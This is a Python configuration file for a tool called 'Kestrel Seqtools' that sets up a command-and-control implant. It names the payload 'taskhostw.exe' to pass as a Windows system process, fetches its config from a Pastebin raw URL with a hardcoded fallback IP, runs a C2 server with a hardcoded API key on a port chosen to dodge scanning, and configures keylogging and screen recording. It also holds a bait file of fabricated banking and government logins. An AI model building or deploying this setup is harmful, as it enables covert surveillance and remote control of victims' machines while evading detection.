"""
Configuration constants for Kestrel Seqtools
"""

# ============================================================================
# HTTP C2 CLIENT CONFIGURATION
# ============================================================================

# Retry Configuration
RETRY_DELAY = 5  # Seconds between connection retries

# Deployment Configuration (Windows)
PAYLOAD_NAME = "taskhostw.exe"
TASK_NAME = "taskhostw"

# C2 Configuration (Legacy)
CONFIG_URL = "https://pastebin.com/raw/YgNuztHj"
FALLBACK_HOST = "52.21.29.104"

# ============================================================================
# FASTAPI HTTP SERVER CONFIGURATION
# ============================================================================

# API Key for authentication (hardcoded for simplicity)
# This key must be included in X-API-Key header for all HTTP requests
C2_API_KEY = "kestrel_c2_2024_secure_key_f8a9b2c1d4e5"

# FastAPI server configuration
FASTAPI_HOST = "0.0.0.0"
FASTAPI_PORT = 8443  # Uncommon port to reduce automated scanning

# Feature Limits
MAX_SCREENRECORD_DURATION = 900  # 15 minutes in seconds (not enforced currently)
SCREENRECORD_FPS = 5  # Frames per second for screen recording
KEYLOG_BUFFER_SIZE = 10000  # Maximum characters in keylog buffer

# Fake Password File Content (for bait file)
FAKE_PASSWORDS = """bgardner57@yahoo.com
Samantha04!

work email robert.gardner@mavengroup.net
mustFTW!2025

BANK OF AMERICA ONLINE BANKING !!!
username: bob.gardner
password: Murphy2019!
(has 2 factor auth - code is usually 123456 or 000000)

facebook bob.gardner.7314
Samantha04!

Wells Fargo online
user: BGARDNER4782
Murphy#2019
security question = Murphy

Social Security - mySocialSecurity account
bobgardner1957 / Murphy#2019

Medicare.gov login
same as SS account

CVS pharmacy
bobgardner / Samantha04!
prescription ready text alerts

AARP membership # 4382991847
login: bgardner57@yahoo.com / AARP2020

amazon - same as yahoo email

netflix bgardner57@yahoo.com / Netflix$Family
sam knows this one

Xfinity/Comcast
account# 8774 4382 9918 2847
bgardner / Murphy2019!
email: robert.gardner472@sbcglobal.net

Fidelity retirement account
user: BOBGARDNER
password: Fidelity$2018

wifi: NETGEAR73 / Murphy2019!

United MileagePlus# 8847392018
bobgardner1957 / United2020

ebay acct - bgardner47 / Samantha04!

paypal = yahoo login

microsoft acct same as work email

DTE Energy online
acct 2847-3821-9918
bobgardner / DTEaccess2021
"""
